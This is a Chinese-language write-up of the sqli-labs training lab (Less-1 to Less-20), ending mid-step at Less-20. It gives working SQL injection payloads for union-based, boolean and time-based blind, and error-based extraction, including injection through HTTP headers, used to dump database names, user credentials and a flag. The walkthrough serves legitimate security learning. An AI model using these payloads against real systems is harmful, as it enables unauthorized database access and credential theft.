# sqli-labs

打开网页，似乎有很多的题目，从第一题开始

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/K)GB)Y$K0]X7S9AW)_AVDY3.png?raw=true">

## Page-1

### Less-1

打开网页，什么都没有，屏幕中间提示我们输入id作为参数

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/N716C{K$9HYE_]S[R$(0(4Q.png?raw=true">

在url栏添加 `?id=1` ，页面变化

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/M]2XK[PCACJ[P~Q9}A2M$$0.png?raw=true">

下面判断注入点，输入 `?id=1 and 1=1` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/Q9B(F@X0J}BKG0TNMW86(HN.png?raw=true">

输入 `?id=1 and 1=2` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/YXK98G(2@54IV80[LNOV7`C.png?raw=true">

输入 `?id=1'` 报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/E89DYY@949HQLD%4$NY[1NX.png?raw=true">

输入 `?id=1' %23` 成功，确定存在注入点，字符型注入，单引号闭合

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/0UK$8ZD7AI~U2L7EJTT`@LW.png?raw=true">

*注：%23实际上是#的url编码*

然后判断字段数，屏幕上显示两个字段，我们从2个字段开始尝试，成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L$ZD4__NZTM4I$AJ1D@PLNQ.png?raw=true">

3个字段成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/[2AL2(S$XP6X1FT}03`CK]I.png?raw=true">

4个字段报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/{X_H{439@%T_QZP7XFF{D}A.png?raw=true">

然后开始判断回显点

```sql
?id=0' union select 1,2,3 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/B95A8QVSA0N@Q7M%7{495~7.png?raw=true">

确定回显点为2,3，获取数据库名

```sql
?id=0' union select 1,version(),database() %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H9W_GS}_22[SWJN5R23{(WU.png?raw=true">

获取到数据库名为Security，查看该数据库下所有表名

```sql
?id=0' union select 1,version(),group_concat(table_name) from information_schema.tables where table_schema=database() %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6ZC4H5_J_@R8@[F$P7A3~1N.png?raw=true">

注意到存在一个表名为users，查看其字段名

```sql
?id=0' union select 1,version(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/@4D)`]ZX3]L$8UBQ2O%WMAX.png?raw=true">

发现敏感词汇 `username` 和 `password` ，获取其中的值，中间用id隔开

```sql
?id=0' union select 1,version(),group_concat(username,id,password) from security.users %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H90A2JO{XJOXV6ONEHAK~_1.png?raw=true">

获取到管理员账号密码，注入成功。但是我们还要获取flag，下面查询所有数据库名

```sql
?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/$YM6ZO66$9C$$3Z{DUDM81G.png?raw=true">

发现其中有个库为 `ctftraining` ，查询其所有表

```sql
?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining' %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/BBMSO8$525$6428_4EW_R%K.png?raw=true">

发现ctf表，查询字段

```sql
?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='ctftraining' and table_name='flag' %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/@GMO9NS1CTG0PKL_IN2]V(1.png?raw=true">

查询字段信息，成功获取flag。以下获取flag步骤省略。

```sql
?id=0' union select 1,2,flag from ctftraining.flag %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/_RWECF[QFCL{[P$QO2IQ5CP.png?raw=true">

### Less-2

封面和Less-1一样，先开始判断注入点，输入 `?id=1 and 1=1` ，成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/`5$2$@SA}Y8N1SDBUIWPCL0.png?raw=true">

输入 `?id=1 and 1=2` 无结果

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/7PMI5L94B44DS0F)073A78T.png?raw=true">

输入 `?id=1'` 报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/ADPA9(ET3R5O@U2FQM3{{U9.png?raw=true">

输入 `?id=1' %23` 报错，确定存在注入点，数字型注入

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/VEJ~XGGIZ_B{W)X)8PJ8}1P.png?raw=true">

下面过程和Less-1一样，省略

*注：此题注入语句为 `?id=0 <SQL Injection Statement>`* 

### Less-3

开始判断注入点，下面直接公布结论

- `?id=1 and 1=1` 成功

- `?id=1 and 1=2` 成功

- `?id=1'` 报错

- `?id=1' %23` 报错

这时仔细观察输入 `?id=1'` 时的报错信息，与Less-1相比，多了一个括号

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/DZ%DWK0PIHH}MP]N)8_FKK9.png?raw=true">

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/CWIE@{I)CMFD(6LH]SLJMU0.png?raw=true">

因此在构建语句的时候，也需要把括号考虑在内，输入 `?id=1') %23` 成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/[DZI}XV{9$~WU[A(2]025BX.png?raw=true">

下面过程和Less-1一样，省略

*注：此题注入语句为 `?id=0') <SQL Injection Statement> %23`* 

### Less-4

使用 `1 and 1=1` ， `1 and 1=2` ， `1'` 均无报错，考虑可能是双引号闭合，使用双引号进行尝试

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/2QWU%BT[VUC0O4UQ$]}06N8.png?raw=true">

根据报错信息，双引号后还有个括号，因此尝试 `1") %23`

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L]BFGW[I55E[L1Z7BDN16M3.png?raw=true">

查询成功，以下过程省略

*注：此题注入语句为 `?id=0") <SQL Injection Statement> %23`* 

### Less-5

根据报错信息，可以确定本题为字符型注入

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/95N3IWZGFV{@_4O3AW3WYSW.png?raw=true">

但是，填入 `?id=1' %23` 后，页面不存在回显点

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/DVMQ80(63AOWW1%26PL{2GS.png?raw=true">

进行布尔盲注，先判断数据库名长度，使用二分法

```sql
?id=1' and length((select database()))>9 %23
```

*注： `length()` 函数是获取返回值的长度*

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/B(_@MYR%KE_%EUG444KF701.png?raw=true">

无返回结果，数据库名长度小于等于9

```sql
?id=1' and length((select database()))>4 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/_V{}_IM[{}6X(J~C_%U8QNW.png?raw=true">

有返回结果，现在使用等于一个一个尝试，过程省略，直接公布结果

```sql
?id=1' and length((select database()))=8 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/GL~C(4~_}1QA~0`2MZ50W]W.png?raw=true">

确定数据库名长度为8，现在开始判断数据库名，下面的语句是判断第一个字母是否为大写A

```sql
?id=1' and ascii(substr((select database()),1,1))=65 %23
```

*注： `ascii()` 函数将参数转换为ascii码， `substr(arg1, arg2, arg3)` 是截取函数，返回值是一个字符串，arg1为截取内容，arg2是相对截取位置，从1开始，arg3是截取长度*

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/}TGW0Y$BI58G{F(]}SYX$J0.png?raw=true">

无返回结果，说明第一个字母不是大写A，然后继续判断大写B，以下过程省略

```sql
?id=1' and ascii(substr((select database()),1,1))=115 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/X2VBV)}L_MHMCV3S}]O[KUQ.png?raw=true">

当判断到115的时候出现返回结果，确定数据库名第一个字母为小写s，然后开始判断第二个字母，以下过程省略

*注：判断字母同样可以使用二分法*

现在已知数据库名为security，开始判断所有表名长度

```sql
?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>10 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/LZDDYKG)A]6E${JVJ`7U3TM.png?raw=true">

出现返回结果，所有表名长度大于10 

```sql
?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>50 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/~NWV2JTAV09CXAR[Z%X(X6W.png?raw=true">

无返回结果，所有表名长度小于等于50

```sql
?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/3HO3{CW(0$2}{@`6)M}876F.png?raw=true">

最后确定表名长度为29，开始判断表名第一个字母

```sql
?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>97 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/OT)C)N)(2_}B(SI[PY1TMG0.png?raw=true">

出现返回结果，第一个字母大于小写a

```sql
?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>116 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6K{%5~R4CJY78ST$W2J`TRT.png?raw=true">

无返回结果，第一个字母小于等于小写t

```sql
?id=1' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/U}FHJB~25(B)`7N81]G`7U9.png?raw=true">

最终确定表名第一个字母为小写e，后面步骤省略，最终得到所有表名为 `emails,referers,uagents,users` ，下面开始判断字段名

*注：有效表名长度为26，包含3个逗号，共29*

```sql
?id=1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>97 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/Z5EQTOJSSY1$@(C9MC0XH{C.png?raw=true">

有返回结果，字段第一个字母大于小写a，剩下过程省略，最终得到所有字段名为 `id,password,username` ，下面开始逐一判断字段内容

```sql
?id=1' and ascii(substr((select group_concat(username,id,password) from security.users),1,1))>97 %23
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6HPFC9V{U3)NQEN1K{VDP}Y.png?raw=true">

图片仅供参考，下方图片为sqlmap查询到的所有字段结果

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/PBCIK6$Z8LVQK{C43SKILS0.png?raw=true">

*注：注入语句为 `?id=1' [Sql Injection Statement] %23`*

### Less-6

和Less-5一样，根据报错信息，使用双引号即可

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/0R$)3LMVB`KL%EURL}IGPKT.png?raw=true">

*注：注入语句为 `?id=1" [Sql Injection Statement] %23`*

### Less-7

输入 `1'` , `1' %23` 报错， `1"` 不报错，确定是单引号闭合，但是没有报错提醒

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/89A6K2I@5FVUZQ0C$O9I8%S.png?raw=true">

继续尝试添加括号，到 `1')) %23` 时无报错

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/JYZ[N68OCU[[83ATGT9]K0U.png?raw=true">

下面跟Less-5一样

*注：注入语句为 `?id=1')) [Sql Injection Statement] %23`*

### Less-8

和Less-5一样，只是报错没有任何显示，但是不报错有显示

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H3X05ERM@)L1@_CWR6}`LB2.png?raw=true">

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/3VFHK~]J1%6C$14_3[D$]J1.png?raw=true">

*注：注入语句为 `?id=1' [Sql Injection Statement] %23`*

### Less-9

无论输入什么页面都不变化，进行时间盲注，先判断注入类型

```sql
?id=1' and if(1=1,sleep(5),1) %23
```

睡眠5秒，注入类型正确

```sql
?id=1' and if(length((select database()))>9,sleep(5),1) %23
```

*注： `if(arg1, arg2, arg3)` 函数判断arg1的布尔值，若为TRUE，执行arg2，否则执行arg3*

页面无睡眠，数据库长度小于等于9

```sql
?id=1' and if(length((select database()))=8,sleep(5),1) %23
```

页面睡眠，确定数据库长度为8。时间盲注只是将布尔盲注添加到if()函数中作为arg1，查看页面是否睡眠，此题省略

*注：注入语句为 `?id=1' if([Sql Injection Statement],sleep(time),1) %23`*

### Less-10

使用 `?id=1' and if(1=1,sleep(5),1) %23` 不睡眠，考虑是双引号闭合

```sql
?id=1" and if(1=1,sleep(5),1) %23
```

睡眠5秒，注入类型正确。以下过程省略

*注：注入语句为 `?id=1" if([Sql Injection Statement],sleep(time),1) %23`*

### Less-11

出现一个登录页面，登录错误时出现一个图片

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/28SE@G]HX%2PF2G5XNBNQ92.png?raw=true">

判断注入点，输入 `1'` 报错， `1' #`不报错，确定存在注入点，单引号闭合

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/4LWKRHHO)$4UX7``5`(F~[1.png?raw=true">

跟Less-1一样，此题省略

*注：注入语句为 `1' [Sql Injection Statement] #`*

### Less-12

把Less-11的单引号改成双引号加括号

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/]4QC{67R~Z)~QFQCJVC`M(8.png?raw=true">

*注：注入语句为 `1") [Sql Injection Statement] #`*

### Less-13

单引号加括号

*注：注入语句为 `1') [Sql Injection Statement] #`*

### Less-14

双引号闭合

*注：注入语句为 `1" [Sql Injection Statement] #`*

### Less-15

输入 `1'` ， `1"` ， `1 and 1=1` 等均显示登陆失败

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/UK%JKCDKKZI~[%UN{DAMZF7.png?raw=true">

输入 `1' or 1=1 #` 提示登录成功

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/N9H5~L`ETU6PZVPZ1A~8E20.png?raw=true">

确定存在注入点，字符型注入，单引号闭合，没有报错信息，但是可以使用登陆成功的图片进行参考，进行布尔盲注。过程省略，直接公布使用sqlmap查询到的结果。

查询数据库名

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/CHO1KZ(~O0GUVSC0OODP[CB.png?raw=true">

查询所有表名

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/VGPBRWIN4H@E[6XQ58VZ07M.png?raw=true">

查询users表下的所有字段名

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/N)`C@BC83E[R0_RO_FVEY$L.png?raw=true">

查询字段username和password的内容

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/)T4F@I}(7UX7P4IYDOQA}HC.png?raw=true">

*注：注入语句为 `1' [Sql Injection Statement] #`*

### Less-16

双引号加括号，布尔盲注

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/SC9_11F_R]USZ7AV37_$F$W.png?raw=true">

*注：注入语句为 `1") [Sql Injection Statement] #`*

### Less-17

Less-17的页面和之前不同，是一个密码更改的页面

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/NI9S@RZOX`_[UQVR7F5S4)V.png?raw=true">

无论输入注入语句，都没有报错信息，且会被嘲讽

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/S5](]DQT490GF%%1(3`[[QY.png?raw=true">

尝试正常输入，用户名为admin，密码为1

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/%FF50WGD7Y5D8DR}}MCYB8Q.png?raw=true">

提示更改密码成功，试试在密码栏构造sql注入语句

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L${R2XDM9BW2_{MJAE1(J1S.png?raw=true">

出现报错，推测此题可能对username栏进行了过滤，换一个用户名尝试

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/~W[4Q@VB1QV3`J{[U%@L8CD.png?raw=true">

无报错信息，将username栏置空尝试

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/9_D6Z)(T68Y{QF[R1W7P4M8.png?raw=true">

#### Extractvalue()

同样没有报错信息，确定对username栏进行了过滤，且必须是数据库中存在的用户名，下面使用 `extractvalue()` 报错注入，先查询数据库

```sql
1' and (extractvalue(1,concat(0x5c,database())))#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/5])S`A6VB5TUR@1JOKTCZ8Q.png?raw=true">

*注： `extractvalue(arg1, arg2)` 函数在arg1中获取符合arg2格式的值，若arg2格式错误，则会返回报错信息，此题的报错信息就是不存在\security格式。concat()类似于group_concat()*

查询所有表

```sql
1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/T_8){0I%HAPAJ_B`56J1QAH.png?raw=true">

查询字段

```sql
1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))))#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/JM4DA(QH)5P6G_O7ZTR1H9L.png?raw=true">

查询字段内容

```sql
1' and (extractvalue(1,concat(0x5c,(select group_concat(username,' ',password) from security.users where username='admin'))))#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/56`8Y%NQR`)X64RBLU[)VZG.png?raw=true">

*注：报错信息有长度限制，如果使用id查询，请指定具体id，以下是查询所有结果的页面*

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L~R9MU]93G5Y8CSS%8%B2QT.png?raw=true">

*注：注入语句为 `1' and (extractvalue(1,concat(0x5c,<(Sql Injection Statement)>)))#`*

#### Updatexml()

`updatexml()` 函数和 `extractvalue()` 类似，只是语法有所不同

查询第一个数据库名

```sql
1' and (updatexml(1,concat(0x5c,(select schema_name from information_schema.schemata limit 0,1)),1))#
```

*注：`updatexml(arg1, arg2, arg3)` 函数在arg1中获取符合arg2格式的值，更新为arg3。arg2为Xpath格式*

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/BM%0MS$7%EJA~EN~V{H}LSK.png?raw=true">

#### Group By

group by报错注入相较于其他几个报错注入有一定难度，下面作详细解释。先来说说 `rand()` , `floor()` , `count()` , `group by`

**Rand()**

`rand()` 函数的作用是随机产生一个随机数表，并列行输出随机数

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/FD`HQ0_A[W%1{~@AZ9EG_MH.png?raw=true">

`rand(seed)` 的括号中间还可以使用种子，每个种子对应一个随机数表，相同的种子产生的随机数表一定相同

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/S)HJEV_%)]}%$WUAQM([)92.png?raw=true">

**Floor()**

`floor()` 函数的作用是向下取整，即断尾

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/2W}RE%{9LIF(FN545O_A6NN.png?raw=true">

如果我们将 `rand()` 和 `floor()` 结合使用，就可以得到一串确定的0和1数字表

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/9LM`}_GQIW@ML00KXD4QJ(8.png?raw=true">

**Count()**

`count()` 函数的作用是计算指定分组的列数量

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/[YKF_H[)PU@P`L6RU4_B%T4.png?raw=true">

**Group by**

`group by` 子句在<a href="https://github.com/Ki1z/PHP-Study-Notes/blob/main/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">MySQL笔记</a>里有详细的解释，这里简单复习一下。 `group by` 主要用来对数据进行分组

未分组

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/)KA@[G16PSEHJU9XA2A@3Z4.png?raw=true">

根据性别分组

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/0%O4E}$A)2`Z2(E1K8LCP80.png?raw=true">

根据id进行分组

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/Y1ETNERP}]YTK~V$15E7S]A.png?raw=true">

从上两张图可以看出根据id分组并没有效果，而根据性别分组却只有两个结果。因为group by实际上是返回每组的第一个查询结果，通过 `count()` 就可以看出来

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/EMS6MYNQXXOZ1IJ78YEV%7H.png?raw=true">

`group by` 不仅可以指定字段进行分组，还可以使用其他值

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/YC`TV]B@]K71~R@AJ8I`RZ4.png?raw=true">

这里将student表根据"id"进行分组，通过count可以知道总共有13条查询结果。下面通过分析group by的原理来探讨一下为什么会出现这种情况

- 使用id进行group by分组时，会依次取出表中的每个记录并创建一个临时表，表中有两个字段，一个是id，另一个则是count。group by后面的字段就是该表的主键，每取出一个结果，如果临时表里已经拥有了该主键，那么count + 1，如果临时表中不存在该主键，则将该主键插入到临时表中。现在模拟一下使用id进行分组，字段id下的值作为主键，首先取得第一条结果，结果中有主键字段，临时表中没有主键01，则插入这条结果；然后取得第二条结果，结果中有主键字段，临时表中没有主键02，则插入这条结果......以此类推，13条结果的id都不一样，则分组的结果也会是13条

- 使用"id"进行group by分组时，会直接将"id"字符串作为主键插入到临时表中，每次获取结果时，"id"主键一定存在，因此每条结果都会让count + 1，最后分组结果为1条

**报错注入**

```sql
select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/WT]W}@_}7RKD)XPH5$W$G]8.png?raw=true">

**原理分析**

先来模拟查询，从 `information_schema.tables` 中查询所有结果的条数，按照 `database() + floor(rand(0)*2)` 的条件进行分组。先进行第一次查询，执行 `concat(database(),floor(rand(0)*2))` ，结果为test0（数据库名 + floor(rand(0)*2))第一次的值，依次为011011...），将test0与临时表中的主键对比，不存在，则再次执行 `concat(database(),floor(rand(0)*2))` ，得到结果为test1，将test1插入到临时表中作为主键；然后进行第二次查询，同样先执行 `concat(database(),floor(rand(0)*2))` ，结果为test1，与临时表作对比，临时表中存在test1主键；进行第三次查询，执行 `concat(database(),floor(rand(0)*2))` ，结果为test0，与临时表作对比，临时表中不存在test0主键，则再次执行 `concat(database(),floor(rand(0)*2))` ，得到的结果为test1，将test1插入到表中作为主键，但是此时临时表中已经存在test1主键，报错主键冲突，将需要的信息携带出来

下面回到原题进行报错注入，先查询数据库

```sql
1' and (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)))#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6EGYL1FOE$PB3PSI3GG3(VK.png?raw=true">

确定数据库为security，挨个查询表

```sql
1' and (select count(*) from information_schema.tables group by concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2)))#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/CV7KX(9M}Y9Z7E4N0PL56Y8.png?raw=true">

*注：需要查询其他表修改limit即可*

确定表为users，挨个查询字段

```sql
1' and (select count(*) from information_schema.columns group by concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),floor(rand(0)*2)))#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/KXB_YLBP7H7U1%E1C~]MC}N.png?raw=true">

查询字段内容（Mistaken）

```sql
1' and (select count(*) from information_schema.columns where table_schema=database() group by concat((select password from security.users limit 0,1),floor(rand(0)*2)))#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/DU48RZSR2$Y0ROD[P_[`9}P.png?raw=true">

报错，因为mysql不支持查询和更新是一张表，所以我们需要一张中间表

查询字段内容（Fixed）

```sql
1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat((select password from security.users limit 0,1),'<-password',floor(rand(0)*2)))a)#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/F`5~K7`FDIQF4A{`ZFKC]UQ.png?raw=true">

*注：在使用了中间表后，必须使用别名才能使用*

### Less-18

输入正确的用户名和密码，页面会显示User Agent，判断User Agent处可能存在sql语句，进行抓包，在User Agent后面添加一个单引号

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/)F@HT{4O}{WY9I[Q9OE]563.png?raw=true">

页面出现报错，推测正确，根据报错，User Agent处有三个变量，分别是'User Agent'，'IP'和'Username'，尝试构造攻击语句，这里注意，admin后面还有一个括号

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/EO2J6_64%1G{VLMOEL%I8`C.png?raw=true">

报错消失，开始报错注入，这里我使用extractvalue()

```sql
1',2,(extractvalue(1,concat(0x5c,version()))) )#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/TCASWI8GDM}PNDF(TPXE2XS.png?raw=true">

以下步骤省略

### Less-19

这次显示的是Referer

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/5W@DVLN0$5VZ41V{W){SZXR.png?raw=true">

同样抓包加单引号

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/3{[F~5[[MI}$BU$4CETGP0N.png?raw=true">

这次只有两个变量，'Referer'和'IP'，但是后面同样有个括号，开始构建攻击语句

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/}]NCYH`9NZBABQOT6UFH%2G.png?raw=true">

报错消失，进行报错注入，使用updatexml()

```sql
1',(updatexml(1,concat(0x5c,version()),1)) )#
```

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/T9HH(MG7@{0`[GYTLR1DH[O.png?raw=true">

以下步骤省略

### Less-20

这次显示的是cookie

> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/QE1OBSWA%2XU86)9F_AQN~B.png?raw=true">

抓包加单引号

